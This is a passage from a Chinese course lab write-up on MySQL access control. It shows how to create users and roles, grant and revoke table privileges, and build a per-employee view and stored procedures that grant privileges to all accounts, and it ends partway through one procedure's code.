    <content type="html"><![CDATA[<h1 id="《数据库系统概论》课程之实验三：数据控制（安全性部分）"><a href="#《数据库系统概论》课程之实验三：数据控制（安全性部分）" class="headerlink" title="《数据库系统概论》课程之实验三：数据控制（安全性部分）"></a>《数据库系统概论》课程之实验三：数据控制（安全性部分）</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a><strong>实验目的</strong></h2><p>（1）熟悉通过SQL对数据进行安全性控制。</p><p>（2）完成书本上习题的上机练习。</p><h2 id="实验平台MySQL"><a href="#实验平台MySQL" class="headerlink" title="实验平台MySQL"></a>实验平台MySQL</h2><p>MySQL8.0及其图形化工具Navicat Premium。</p><h2 id="实验内容和要求"><a href="#实验内容和要求" class="headerlink" title="实验内容和要求"></a>实验内容和要求</h2><p>​        使用SQL对数据进行安全性控制，包括：授权和权利回收。操作完成后查看已授权的用户是否真正具有授予的数据操作的权利；权利收回操作之后的用户是否确实丧失了收回的数据操作的权利）。根据以下要求认真填写实验报告，记录所有的实验用例。</p><p>教材：《数据库系统概论》第5版——第四章习题P153</p><h3 id="第6题"><a href="#第6题" class="headerlink" title="第6题"></a>第6题</h3><p>对下列两个关系模式：</p><p>​        学生（学号，姓名，年龄，性别，家庭住址，班级号）</p><p>​        班级（班级号，班级名，班主任，班长）</p><p>使用GRANT语句完成下列授权功能：</p><p>（1）授予用户U1对两个表的所有权限，并可给其他用户授权。</p><p>（2）授予用户U2对学生表具有查看权限，对家庭住址具有更新权限。</p><p>（3）将对班级表查看权限授予所有用户。</p><p>（4）将对学生表的查询、更新权限授予角色R1.</p><p>（5）将角色R1授予用户U1，并且U1可继续授权给其他角色。</p><h4 id="建表"><a href="#建表" class="headerlink" title="建表"></a>建表</h4><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SQL"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> 班级<br>(<br>班级号 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">31</span>) <span class="hljs-keyword">PRIMARY</span> KEY,<br>班级名 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">15</span>),<br>班主任 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">15</span>),<br>班长 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">15</span>)<br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> 学生 <br>(<br>学号 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">31</span>) <span class="hljs-keyword">PRIMARY</span> KEY,<br>姓名 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">15</span>),<br>年龄 <span class="hljs-type">INT</span>,<br>性别 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">7</span>),<br>家庭住址 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>),<br>班级号 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">31</span>),<br><span class="hljs-keyword">FOREIGN</span> KEY(班级号) <span class="hljs-keyword">REFERENCES</span> 班级(班级号)<br>);<br></code></pre></div></td></tr></table></figure><ul><li>注意：先建”班级”表，因为”班级”表的主键”班级号”是”学生”表的字段”班级号”的外键（或者先建”职工“表，后建”部门“表，再使用<code>ALTER TABLE 学生 ADD FOREIGN KEY (班级号) REFERENCES 班级(班级号);</code>添加外键）</li></ul><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>授予用户U1对两个表的所有权限，并可给其他用户授权。</p><ul><li><p>先创建用户U1</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;U1&#x27;</span>IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220401183413062-16654561790844.png" alt="image-20220401183413062"></p></li><li><p>再授予权限</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> `db4<span class="hljs-number">.6</span>`.`学生` <span class="hljs-keyword">TO</span> `U1` <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> OPTION;<br><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> `db4<span class="hljs-number">.6</span>`.`班级` <span class="hljs-keyword">TO</span> `U1` <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> OPTION;<br></code></pre></div></td></tr></table></figure><ul><li><p>注意，对于MySQL，<strong>授予权限</strong>时只能使用<code>WITH GRANT OPTION</code>使权限可传递。</p><p><img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220401184719216-16654561790843.png" alt="image-20220401184719216"></p></li></ul></li></ul><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>授予用户U2对学生表具有查看权限，对家庭住址具有更新权限。</p><ul><li><p>先创建用户U2</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;U2&#x27;</span>IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220401194854387-16654561790845.png" alt="image-20220401194854387"></p></li><li><p>再授予权限</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">SELECT</span>,<span class="hljs-keyword">UPDATE</span>(`家庭住址`) <span class="hljs-keyword">ON</span> `学生` <span class="hljs-keyword">TO</span> `U2`;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220401194919632-16654561790846.png" alt="image-20220401194919632"></p></li></ul><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>将对班级表查看权限授予所有用户。</p><p><strong>由于MySQL没有PUBLIC关键字</strong>。故这里创建一个存储过程：把所有用户及其地址读至游标，遍历所有用户及其地址，并用grant语句分别授权，并查看权限进行验证。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">delimiter $$ -- 定界符<br>CREATE PROCEDURE grant_select_table1_to_pubic () <br>BEGIN<br>DECLARE v_user CHAR ( 32 ); -- 定义变量，用于储存用户名：<br>DECLARE v_host CHAR ( 32 ); -- 定义变量，用于储存地址：<br>DECLARE done INT DEFAULT FALSE; -- 定义结束标志<br>DECLARE cur CURSOR FOR SELECT user,host FROM mysql.USER;  -- 定义游标（用户名及其地址）<br># where user &lt;&gt; &#x27;root&#x27; and user not like &#x27;%.%&#x27; and user &lt;&gt;&#x27;&#x27; ;<br>DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;  -- 定义 NOT FOUND类异常的HANDLER：<br><br>OPEN cur; -- 打开游标<br>FETCH cur INTO v_user,v_host; -- 取游标的一行数据到变量，并推进游标<br><br>-- 每取一个user，构造一条授权语句，然后执行这条语句<br>-- 因为grant语句不接受变量，所以只能构造整条语句<br>WHILE NOT done DO<br><br>SET @QUERY = CONCAT( &#x27;GRANT SELECT ON `班级` to \&#x27;&#x27;, v_user,&#x27;\&#x27;@\&#x27;&#x27;,v_host,&#x27;\&#x27;&#x27;); -- 授权语句<br>PREPARE statement FROM@QUERY;<br>EXECUTE statement;<br>SET @QUERY = CONCAT( &#x27;SHOW GRANTS FOR \&#x27;&#x27;, v_user,&#x27;\&#x27;@\&#x27;&#x27;,v_host,&#x27;\&#x27;&#x27;); -- 查看权限语句<br>PREPARE statement FROM@QUERY;<br>EXECUTE statement;<br>DEALLOCATE PREPARE statement;<br>FETCH cur INTO v_user,v_host; -- 取下一个用户及其地址<br>END WHILE;<br><br>CLOSE cur;<br><br>END $$<br><br>CALL grant_select_table1_to_pubic ();  -- 调用存储过程，授权给所有用户:<br></code></pre></div></td></tr></table></figure><ul><li><p>结果如下：对所有用户授权成功</p><p><img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220401231019589-16654561790847.png" alt="image-20220401231019589"></p><p><img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220401231033201-16654561790848.png" alt="image-20220401231033201"></p><p><img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220401231125226-166545617908510.png" alt="image-20220401231125226"></p><p><img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220401231157009-16654561790849.png" alt="image-20220401231157009"></p><p><img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220401231407276-166545617908511.png" alt="image-20220401231407276"></p><p><img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220401231420023-166545617908512.png" alt="image-20220401231420023"></p></li></ul><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>将对学生表的查询、更新权限授予角色R1</p><ul><li><p>先创建角色R1</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ROLE R1<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220401201556069-166545617908513.png" alt="image-20220401201556069"></p></li><li><p>再授予权限</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">SELECT</span>,<span class="hljs-keyword">UPDATE</span><br><span class="hljs-keyword">ON</span> `学生`<br><span class="hljs-keyword">TO</span> R1;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220401201627245-166545617908514.png" alt="image-20220401201627245"></p></li></ul><h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>将角色R1授予用户U1，并且U1可继续授权给其他角色。</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SQL"><span class="hljs-keyword">GRANT</span> R1<br><span class="hljs-keyword">TO</span> U1<br><span class="hljs-keyword">WITH</span> ADMIN OPTION;<br><br>#注意：要激活角色<br><span class="hljs-keyword">SET</span> <span class="hljs-keyword">DEFAULT</span> ROLE R1 <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;U1&#x27;</span>;<br></code></pre></div></td></tr></table></figure><ul><li>在MySQL中，将<strong>角色</strong>授予用户，，则需要使用<code>WITH ADMIN OPTION</code>，而无法使用<code>WITH GRANT OPTION</code>。</li><li><strong>只有通过<code>SET DEFAULT ROLE R1 TO &#39;U1&#39;</code>激活，U1才会拥有角色R1的权限。</strong></li></ul><h4 id="查看授权结果"><a href="#查看授权结果" class="headerlink" title="查看授权结果"></a>查看授权结果</h4><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SHOW</span> GRANTS <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;U1&#x27;</span>;<br><span class="hljs-keyword">SHOW</span> GRANTS <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;R1&#x27;</span>;<br><span class="hljs-keyword">SHOW</span> GRANTS <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;U2&#x27;</span>;<br></code></pre></div></td></tr></table></figure><ul><li><p>U1</p><p><img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220401232638711-166545617908515.png" alt="image-20220401232638711"></p></li><li><p>U2</p><p><img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220401232914870-166545617908516.png" alt="image-20220401232914870"></p></li><li><p>R1</p><p><img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220401232721391-166545617908517.png" alt="image-20220401232721391"></p></li></ul><h3 id="第7题"><a href="#第7题" class="headerlink" title="第7题"></a>第7题</h3><p>今有以下两个关系模式：</p><p>​        职工（职工号，姓名，年龄，职务，工资，部门号）</p><p>​        部门（部门号，名称，经理名，地址，电话号）</p><p>请用SQL语句的GRANT和REVOKE语句（加上视图机制）完成以下授权定义或存取控制功能：</p><p>（1）用户王明对两个表有SELECT权限。</p><p>（2）用户李勇对两个表有INSERT和DELETE权限。</p><p>（3）每个职工只对自己的记录有SELECT权限。</p><p>（4）用户刘星对职工表有SELECT权限，对工资字段具有更新权限。</p><p>（5）用户张新具有修改这两个表的结构的权限。</p><p>（6）用户周平具有对两个表的所有权限（读、插、改、删数据），并具有给其他用户授权的权限。</p><p>（7）用户杨兰具有从每个部门职工中SELECT最高工资、最低工资、平均工资的权限，他不能查看每个人的工资。</p><h4 id="建表-1"><a href="#建表-1" class="headerlink" title="建表"></a>建表</h4><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">CREATE TABLE 部门<br>(<br>部门号 VARCHAR(31) PRIMARY KEY,<br>名称 VARCHAR(15),<br>经理名 VARCHAR(15),<br>地址 VARCHAR(15),<br>电话号 VARCHAR(15)<br>);<br><br>CREATE TABLE 职工 <br>(<br>职工号 VARCHAR(31) PRIMARY KEY,<br>姓名 VARCHAR(15),<br>年龄 INT,<br>职务 VARCHAR(15),<br>工资 DOUBLE,<br>家庭住址 VARCHAR(255),<br>部门号 VARCHAR(31),<br>FOREIGN KEY(部门号) REFERENCES 部门(部门号)<br>);<br></code></pre></div></td></tr></table></figure><ul><li>注意：先建”部门”表，因为”部门”表的主键”部门号”是”职工”表的字段”部门号”的外键。（或者先建”职工“表，后建”部门“表，再使用<code>ALTER TABLE 职工 ADD FOREIGN KEY (部门号) REFERENCES 部门(部门号);</code>添加外键）</li></ul><h4 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h4><p>用户王明对两个表有SELECT权限。</p><ul><li><p>先创建用户</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">CREATE USER 王明;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402145004027-166545617908518.png" alt="image-20220402145004027"></p></li><li><p>再授予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">GRANT SELECT ON TABLE 职工 TO 王明;<br>GRANT SELECT ON TABLE 部门 TO 王明;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402145017024-166545617908519.png" alt="image-20220402145017024"></p></li></ul><h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><p>用户李勇对两个表有INSERT和DELETE权限。</p><ul><li><p>先创建用户</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">CREATE USER 李勇;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402145110724-166545617908520.png" alt="image-20220402145110724"></p></li><li><p>再授予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">GRANT INSERT,DELETE ON TABLE 职工 TO 李勇;<br>GRANT INSERT,DELETE ON TABLE 部门 TO 李勇;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402145241943-166545617908622.png" alt="image-20220402145241943"></p></li></ul><h4 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h4><p>每个职工只对自己的记录有SELECT权限。</p><ul><li><p>先创建相应的视图。USER()的返回值是<strong>用户名和地址</strong>，故假定员工的用户名是”职工“表中的姓名，且从localhost登录数据库。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">create view 职工视图 as select * from 职工 where CONCAT(职工.姓名,&#x27;@localhost&#x27;)=USER();<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220402153904098-166545617908621.png" alt="image-20220402153904098"></p></li><li><p>因为<strong>MySQL没有PUBLIC关键字</strong>，故再如6.3一般调用一个存储过程把视图的select权限授予每个用户</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">delimiter $$<br>CREATE PROCEDURE grant_select_职工视图_to_pubic () <br>BEGIN<br>DECLARE v_user CHAR ( 32 ); -- 定义变量，用于储存用户名：<br>DECLARE v_host CHAR ( 32 ); -- 定义变量，用于储存地址：<br>DECLARE done INT DEFAULT FALSE; -- 定义结束标志<br>DECLARE cur CURSOR FOR SELECT user,host FROM mysql.USER;  -- 定义游标（用户名及其地址）<br>DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;  -- 定义 NOT FOUND类异常的HANDLER：<br><br>OPEN cur; -- 打开游标<br>FETCH cur INTO v_user,v_host; -- 取游标的一行数据到变量，并推进游标<br><br>-- 每取一个user，构造一条授权语句，然后执行这条语句<br>-- 因为grant语句不接受变量，所以只能构造整条语句<br>WHILE NOT done DO<br>SET @QUERY = CONCAT( GRANT SELECT ON 职工视图 to \&#x27;&#x27;, v_user,&#x27;\&#x27;@\&#x27;&#x27;,v_host,&#x27;\&#x27;&#x27;); -- 授权语句<br>PREPARE statement 